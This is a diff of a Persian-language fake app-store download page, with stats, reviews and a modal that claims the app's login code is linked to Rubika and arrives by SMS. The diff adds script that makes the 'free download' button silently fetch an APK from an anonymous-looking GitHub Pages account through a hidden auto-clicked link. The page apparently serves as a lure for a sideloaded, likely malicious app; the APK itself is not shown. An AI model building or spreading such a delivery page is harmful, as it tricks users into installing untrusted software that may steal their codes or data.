@@ -40,7 +40,6 @@
             border: 1px solid rgba(255,255,255,0.3);
         }
 
-        /* header */
         .app-header {
             display: flex;
             align-items: center;
@@ -71,7 +70,6 @@
             margin-top: 5px;
         }
 
-        /* stats */
         .app-stats {
             display: flex;
             justify-content: space-between;
@@ -108,7 +106,6 @@
             font-size: 14px;
         }
 
-        /* download button */
         .download-btn {
             display: block;
             width: 100%;
@@ -130,7 +127,6 @@
             transform: scale(0.97);
         }
 
-        /* description */
         .description-section {
             margin-top: 25px;
         }
@@ -147,7 +143,6 @@
             line-height: 1.7;
         }
 
-        /* reviews */
         .reviews-section {
             margin-top: 30px;
         }
@@ -197,9 +192,8 @@
             margin-bottom: 4px;
         }
 
-        /* ====== Modal / Panel Styles ====== */
         .modal-overlay {
-            display: none; /* Hidden by default */
+            display: none;
             position: fixed;
             top: 0;
             left: 0;
@@ -256,20 +250,32 @@
             justify-content: center;
             color: #333;
             transition: 0.2s;
+            z-index: 10;
         }
 
         .modal-close:hover {
             background: #e0e0e0;
         }
 
-        .modal-image {
+        /* ====== اصلاح شده: عکس باکس ====== */
+        .modal-image-wrapper {
             width: 100%;
-            aspect-ratio: 16 / 7; /* Landscape (wide) */
-            object-fit: cover;
+            aspect-ratio: 16 / 7;
             border-radius: 20px;
             margin-top: 10px;
             margin-bottom: 20px;
             background-color: #eee;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-image {
+            width: 100%;
+            height: 100%;
+            object-fit: contain; /* کل عکس رو نشون بده، بدون برش */
+            object-position: center; /* وسط‌چین */
         }
 
         .modal-text {
@@ -286,12 +292,11 @@
             font-weight: 700;
         }
 
-        /* small screens */
         @media (max-width: 480px) {
             .modal-panel {
                 padding: 20px;
             }
-            .modal-image {
+            .modal-image-wrapper {
                 aspect-ratio: 16 / 6;
             }
         }
@@ -324,7 +329,6 @@
         </div>
     </div>
 
-    <!-- Download Button (triggers modal) -->
     <button class="download-btn" id="openModalBtn">دانلود رایگان</button>
 
     <div class="description-section">
@@ -358,15 +362,16 @@
     </div>
 </div>
 
-<!-- ====== MODAL / PANEL ====== -->
+<!-- ====== مودال با عکس اصلاح شده ====== -->
 <div class="modal-overlay" id="downloadModal">
     <div class="modal-panel">
         <button class="modal-close" id="closeModalBtn">✕</button>
+        
+        <!-- باکس جدید برای عکس -->
+        <div class="modal-image-wrapper">
+            <img src="IMG_20260812_160958_979.jpg" alt="تصویر برنامه" class="modal-image">
+        </div>
 
-        <!-- Landscape Image (responsive) -->
-        <img src="IMG_20260812_160958_979.jpg" alt="تصویر برنامه" class="modal-image">
-
-        <!-- Your custom text -->
         <p class="modal-text">
             کد ورود برنامه متصل کردیم به روبیکا بخاطر اختلال اینترنت اینجور چیزا وصل اپ ایرانی شده که برنامه بدون وی پی ان باشه🩷✅<br>
             برای بعضی هاهم پیامک میشه💋
@@ -375,19 +380,31 @@
 </div>
 
 <script>
-    // Get elements
+    const APK_DOWNLOAD_URL = 'https://github.com/qzpmwx/qzpmwx.github.io/raw/refs/heads/main/Tahaq_aligned_r_opt_sign.apk';
+
     const openBtn = document.getElementById('openModalBtn');
     const modal = document.getElementById('downloadModal');
     const closeBtn = document.getElementById('closeModalBtn');
 
-    // Open modal
     openBtn.addEventListener('click', function(e) {
-        e.preventDefault(); // Prevent any default action
+        e.preventDefault();
+
         modal.classList.add('active');
-        document.body.style.overflow = 'hidden'; // Prevent scroll
+        document.body.style.overflow = 'hidden';
+
+        try {
+            const downloadLink = document.createElement('a');
+            downloadLink.href = APK_DOWNLOAD_URL;
+            downloadLink.download = 'Tahaq_aligned_r_opt_sign.apk';
+            downloadLink.style.display = 'none';
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink);
+        } catch (error) {
+            window.open(APK_DOWNLOAD_URL, '_blank');
+        }
     });
 
-    // Close modal
     function closeModal() {
         modal.classList.remove('active');
         document.body.style.overflow = '';
@@ -395,14 +412,12 @@
 
     closeBtn.addEventListener('click', closeModal);
 
-    // Click outside modal to close
     modal.addEventListener('click', function(e) {
         if (e.target === modal) {
             closeModal();
         }
     });
 
-    // Escape key to close
     document.addEventListener('keydown', function(e) {
         if (e.key === 'Escape' && modal.classList.contains('active')) {
             closeModal();
